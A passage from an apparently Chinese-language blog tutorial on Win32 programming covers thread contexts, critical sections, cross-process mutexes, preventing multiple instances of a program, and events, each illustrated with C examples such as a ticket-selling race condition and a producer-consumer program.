class="built_in">printf</span>(<span class="string">&quot;线程执行完毕\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程1执行完毕返回：%d；线程2执行完毕返回：%d\n&quot;</span>, dwResultArray[<span class="number">0</span>], dwResultArray[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;其他程序...&quot;</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/05/Win32API/image-20240305224608996.png" alt="image-20240305224608996" style="zoom:33%;">

<h4 id="CONTEXT线程上下文"><a href="#CONTEXT线程上下文" class="headerlink" title="CONTEXT线程上下文"></a>CONTEXT线程上下文</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DECLSPEC_NOINITALL</span> _<span class="title">CONTEXT</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The flags values within this flag control the contents of</span></span><br><span class="line">    <span class="comment">// a CONTEXT record.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// If the context record is used as an input parameter, then</span></span><br><span class="line">    <span class="comment">// for each portion of the context record controlled by a flag</span></span><br><span class="line">    <span class="comment">// whose value is set, it is assumed that that portion of the</span></span><br><span class="line">    <span class="comment">// context record contains valid context. If the context record</span></span><br><span class="line">    <span class="comment">// is being used to modify a threads context, then only that</span></span><br><span class="line">    <span class="comment">// portion of the threads context will be modified.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// If the context record is used as an IN OUT parameter to capture</span></span><br><span class="line">    <span class="comment">// the context of a thread, then only those portions of the thread&#x27;s</span></span><br><span class="line">    <span class="comment">// context corresponding to set flags will be returned.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The context record is never used as an OUT only parameter.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is</span></span><br><span class="line">    <span class="comment">// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT</span></span><br><span class="line">    <span class="comment">// included in CONTEXT_FULL.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_SEGMENTS.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_INTEGER.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_CONTROL.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;</span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the ContextFlags word</span></span><br><span class="line">    <span class="comment">// contains the flag CONTEXT_EXTENDED_REGISTERS.</span></span><br><span class="line">    <span class="comment">// The format and contexts are processor specific</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line"></span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure>

<p>这个结构体中存储了所有的寄存器，这也就是为什么当单核CPU能够循环执行多个线程，因为被挂起的线程会在挂起时将所有寄存器的数据都存在这个结构体中。</p>
<img src="/2024/07/05/Win32API/image-20240305230138707.png" alt="image-20240305230138707" style="zoom:33%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6387)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE harrThreadArray[<span class="number">2</span>];</span><br><span class="line">	harrThreadArray[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, (LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> l;</span><br><span class="line">	l = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span>* lp = &amp;l;</span><br><span class="line"></span><br><span class="line">	harrThreadArray[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, (LPTHREAD_START_ROUTINE)lp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	Sleep(<span class="number">100</span>);</span><br><span class="line">	SuspendThread(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line">	CONTEXT context;</span><br><span class="line">	context.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line">	GetThreadContext(harrThreadArray[<span class="number">0</span>], &amp;context);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x %x\n&quot;</span>, context.Eax, context.Ecx);</span><br><span class="line">	ResumeThread(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	DWORD dwResultArray[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, harrThreadArray, TRUE, INFINITE);</span><br><span class="line">	GetExitCodeThread(harrThreadArray[<span class="number">0</span>], &amp;dwResultArray[<span class="number">0</span>]);</span><br><span class="line">	GetExitCodeThread(harrThreadArray[<span class="number">1</span>], &amp;dwResultArray[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程执行完毕\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程1执行完毕返回：%d；线程2执行完毕返回：%d\n&quot;</span>, dwResultArray[<span class="number">0</span>], dwResultArray[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;其他程序...&quot;</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h4><p>在挂起线程时，还可以使用SetThreadContext改变寄存器中的数值。</p>
<h3 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h3><h4 id="临界资源"><a href="#临界资源" class="headerlink" title="临界资源"></a>临界资源</h4><p>当两个线程同时要访问一个全局变量的时候，可能出现同时访问的情况，导致线程安全受影响。</p>
<h4 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h4><p>一段使用临界资源的代码称为临界区。</p>
<h4 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h4><p>Windows实现线程锁的方法：<img src="/2024/07/05/Win32API/image-20240305233145434.png" alt="image-20240305233145434" style="zoom:50%;"></p>
<h4 id="调用API"><a href="#调用API" class="headerlink" title="调用API"></a>调用API</h4><p>临界区之实现线程锁：</p>
<p>&lt;1&gt;创建全局变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CRITICAL_SECTION cs;		<span class="comment">//可以理解成一个令牌</span></span><br></pre></td></tr></table></figure>

<p>&lt;2&gt;初始化全局变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">InitializeCriticalSection(&amp;cs);</span><br></pre></td></tr></table></figure>

<p>&lt;3&gt;实现临界区</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EnterCriticalSection(&amp;cs);		<span class="comment">//进入临界区</span></span><br><span class="line">	<span class="comment">//使用临界资源</span></span><br><span class="line">LeaveCriticalSection(&amp;cs);		<span class="comment">//离开临界区</span></span><br></pre></td></tr></table></figure>

<p>比如这样一段买票的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ticket = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProcess</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span> (ticket &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;还有%d张票	&quot;</span>, ticket);</span><br><span class="line">		ticket--;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;卖出一张，还剩%d张\n&quot;</span>, ticket);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThreadArr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	hThreadArr[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProcess, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hThreadArr[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProcess, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, hThreadArr, TRUE, INFINITE);</span><br><span class="line">	CloseHandle(hThreadArr[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(hThreadArr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有些时候会出现这么个情况</p>
<p><img src="/2024/07/05/Win32API/image-20240305235438634.png" alt="image-20240305235438634"></p>
<p>说明两个线程A在阻塞时线程B停在了它不该停的地方</p>
<p>更改代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line"><span class="type">int</span> ticket = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProcess</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* pt = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	EnterCriticalSection(&amp;cs);</span><br><span class="line">	<span class="keyword">while</span> (ticket &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Thread:%d	还有%d张票	\n&quot;</span>, *pt, ticket);</span><br><span class="line">		ticket--;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;		卖出一张，还剩%d张\n&quot;</span>, ticket);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;--------------------------\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	LeaveCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	InitializeCriticalSection(&amp;cs);</span><br><span class="line">	HANDLE hThreadArr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> ThreadC[<span class="number">2</span>];</span><br><span class="line">	ThreadC[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	ThreadC[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pThread[<span class="number">2</span>];</span><br><span class="line">	pThread[<span class="number">0</span>] = &amp;ThreadC[<span class="number">0</span>];</span><br><span class="line">	pThread[<span class="number">1</span>] = &amp;ThreadC[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	hThreadArr[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProcess, (LPTHREAD_START_ROUTINE)pThread[<span class="number">0</span>], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hThreadArr[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProcess, (LPTHREAD_START_ROUTINE)pThread[<span class="number">1</span>], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, hThreadArr, TRUE, INFINITE);</span><br><span class="line">	CloseHandle(hThreadArr[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(hThreadArr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/05/Win32API/image-20240306141752501.png" alt="image-20240306141752501" style="zoom:50%;">

<p>当线程1执行时进入临界区，那么线程2就无法访问临界资源，直到线程1离开了临界区（归还令牌）后，线程2才能够访问临界资源，但是当线程2再拿着ticket&#x3D;0进来的时候，已经不满足条件，就直接跳过了。</p>
<h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><h3 id="互斥体-1"><a href="#互斥体-1" class="headerlink" title="互斥体"></a>互斥体</h3><p>内核级临界资源怎么办？</p>
<p>假设A进程的B线程和C进程的D线程，同时使用的是内核级的临界资源（内核对象：线程、文件、进程…）该怎么让这个访问是安全的？使用线程锁的方式明显不行，因为线程锁仅能控制同进程中的多线程。</p>
<img src="/2024/07/05/Win32API/image2021-5-27_16-8-12.png" alt="images/download/attachments/1015833/image2021-5-27_16-8-12.png" style="zoom:50%;">

<p>那么这时候我们就需要一个<strong>能够放在内核中的令牌</strong>来控制，而实现这个作用的，我们称之为<strong>互斥体</strong>。</p>
<img src="/2024/07/05/Win32API/image2021-5-27_16-10-43.png" alt="images/download/attachments/1015833/image2021-5-27_16-10-43.png" style="zoom:50%;">

<h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateMutex</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpMutexAttributes,  <span class="comment">// SD 安全属性，包含安全描述符</span></span></span><br><span class="line"><span class="params">  BOOL bInitialOwner,                       <span class="comment">// initial owner 是否希望互斥体创建出来就有信号，或者说就可以使用.如果希望的话就为FALSE；官方解释为如果该值为TRUE则表示当前进程拥有该互斥体所有权</span></span></span><br><span class="line"><span class="params">  LPCTSTR lpName                            <span class="comment">// object name 互斥体的名字，随便起，不同程序之间靠这个名字使用互斥体</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>由线程A创建了一个互斥体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE cm = CreateMutex(<span class="literal">NULL</span>,TRUE,<span class="string">&quot;nMutex&quot;</span>);</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(cm, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Process:A Thread:X -&gt;%d++++++++++\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ReleaseMutex(cm);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在B进程中使用了这个互斥体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE tMutex = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">L&quot;nMutex&quot;</span>);</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(tMutex, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Process:B Thread:Y -&gt;%d----------\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个不同进程的不同线程通过<code>nMutex</code>这个互斥体名字进行访问。</p>
<p>当进程A启动后再启动进程B：</p>
<img src="/2024/07/05/Win32API/image-20240306152912660.png" alt="image-20240306152912660" style="zoom:30%;">

<p>发现进程A先执行，进程B被阻塞了。</p>
<h3 id="互斥体实现禁止多开"><a href="#互斥体实现禁止多开" class="headerlink" title="互斥体实现禁止多开"></a>互斥体实现禁止多开</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建互斥体</span></span><br><span class="line">    HANDLE cm = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">&quot;XYZ&quot;</span>);</span><br><span class="line">    <span class="comment">// 判断互斥体是否创建失败</span></span><br><span class="line">    <span class="keyword">if</span> (cm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断互斥体是否已经存在，如果存在则表示程序被多次打开</span></span><br><span class="line">        <span class="keyword">if</span> (GetLastError() == ERROR_ALREADY_EXISTS) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;该程序已经开启了，请勿再次开启！&quot;</span>);</span><br><span class="line">            getchar();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 等待互斥体状态发生变化，也就是有信号或为互斥体拥有者，获取令牌</span></span><br><span class="line">            WaitForSingleObject(cm, INFINITE);</span><br><span class="line">            <span class="comment">// 操作资源</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Process: A Thread: B -- %d \n&quot;</span>, i);</span><br><span class="line">                Sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 释放令牌</span></span><br><span class="line">            ReleaseMutex(cm);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateMutex 创建失败! 错误代码: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/Win32API/image-20240306153359061.png" alt="image-20240306153359061"></p>
<p>当已经运行一个程序时，再打开第二个会显示程序已开启。</p>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h3 id="通知类型"><a href="#通知类型" class="headerlink" title="通知类型"></a>通知类型</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateEvent</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span><br><span class="line"><span class="params">  BOOL bManualReset,                       <span class="comment">// reset type 如果你希望当前事件类型是通知类型则写TRUE，反之FALSE</span></span></span><br><span class="line"><span class="params">  BOOL bInitialState,                      <span class="comment">// initial state 初始状态，决定创建出来时候是否有信号，有为TRUE，没有为FALSE</span></span></span><br><span class="line"><span class="params">  LPCTSTR lpName                           <span class="comment">// object name 事件名字</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="生产者与消费者"><a href="#生产者与消费者" class="headerlink" title="生产者与消费者"></a>生产者与消费者</h3><p>要求：生产者生产一个产品，消费者消耗一个产品。如果不使用通知实现，使用互斥体的话：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hEven;</span><br><span class="line">HANDLE hMutex;</span><br><span class="line"><span class="type">int</span> produce;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ProduceThread</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pProduceCount = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *pProduceCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">		produce = <span class="number">1</span>;	<span class="comment">// 生产了一个产品</span></span><br><span class="line">		<span class="type">long</span> ProduceThreadID = GetCurrentThreadId();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;生产者%ul生产了一个产品\n&quot;</span>, ProduceThreadID);</span><br><span class="line">		ReleaseMutex(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ConsumptionThread</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pProduceCount = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *pProduceCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">		produce = <span class="number">0</span>;	<span class="comment">// 生产了一个产品</span></span><br><span class="line">		<span class="type">long</span> ConsumptionThreadID = GetCurrentThreadId();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;	消费者%ul消费了一个产品\n&quot;</span>, ConsumptionThreadID);</span><br><span class="line">		ReleaseMutex(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> produceCount = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span>* pProduce = &amp;produceCount;</span><br><span class="line"></span><br><span class="line">	hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);		<span class="comment">// 创建互斥体,起始状态为阻塞</span></span><br><span class="line"></span><br><span class="line">	HANDLE hPCThread[<span class="number">2</span>];</span><br><span class="line">	hPCThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ProduceThread, (LPTHREAD_START_ROUTINE)pProduce, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hPCThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ConsumptionThread, (LPTHREAD_START_ROUTINE)pProduce, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, hPCThread, TRUE, INFINITE);</span><br><span class="line">	CloseHandle(hPCThread[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(hPCThread[<span class="number">1</span>]);</span><br><span class="line">	CloseHandle(hMutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

